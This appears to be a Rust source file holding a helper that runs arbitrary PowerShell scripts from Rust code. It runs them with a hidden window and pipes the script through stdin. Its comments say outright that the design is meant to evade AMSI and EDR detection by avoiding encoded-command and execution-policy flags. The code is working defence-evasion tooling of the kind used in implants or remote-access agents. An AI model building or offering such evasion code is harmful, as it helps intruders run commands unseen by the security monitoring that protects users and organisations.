pub struct PowerShellRunner;

impl PowerShellRunner {
    /// Execute PowerShell script via powershell.exe (Native AOT compatible).
    /// Uses stdin pipe instead of -EncodedCommand to avoid AMSI/EDR detection.
    pub async fn execute(script: &str) -> String {
        execute_via_stdin(script).await
    }
}

/// Execute PowerShell script via stdin pipe.
/// Avoids -EncodedCommand (flagged by all EDRs) and -ExecutionPolicy Bypass.
async fn execute_via_stdin(script: &str) -> String {
    #[cfg(target_os = "windows")]
    {
        use std::process::Stdio;
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let mut child = tokio::process::Command::new("powershell.exe")
            .args(["-NoProfile", "-NonInteractive", "-Command", "-"])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .stdin(Stdio::piped())
            .kill_on_drop(true)
            .spawn()
            .map_err(|e| format!("[Failed to start PowerShell: {}]", e));

        let mut child = match child {
            Ok(c) => c,
            Err(e) => return e,
        };

        // Write script to stdin then close it
        if let Some(mut stdin) = child.stdin.take() {
            let _ = stdin.write_all(script.as_bytes()).await;
            let _ = stdin.shutdown().await;
        }

        // Read stdout and stderr
        let mut stdout = Vec::new();
        let mut stderr = Vec::new();
        if let Some(mut out) = child.stdout.take() {
            let _ = out.read_to_end(&mut stdout).await;
        }
        if let Some(mut err) = child.stderr.take() {
            let _ = err.read_to_end(&mut stderr).await;
        }

        let _ = child.wait().await;

        let stdout_str = String::from_utf8_lossy(&stdout);
        let stderr_str = String::from_utf8_lossy(&stderr);

        if stdout_str.trim().is_empty() && stderr_str.trim().is_empty() {
            "[PowerShell completed with no output]".to_string()
        } else if !stderr_str.trim().is_empty() {
            format!("{}\n[STDERR]\n{}", stdout_str.trim_end(), stderr_str.trim_end())
        } else {
            stdout_str.trim_end().to_string()
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = script;
        "[PowerShell not available on this platform]".to_string()
    }
}
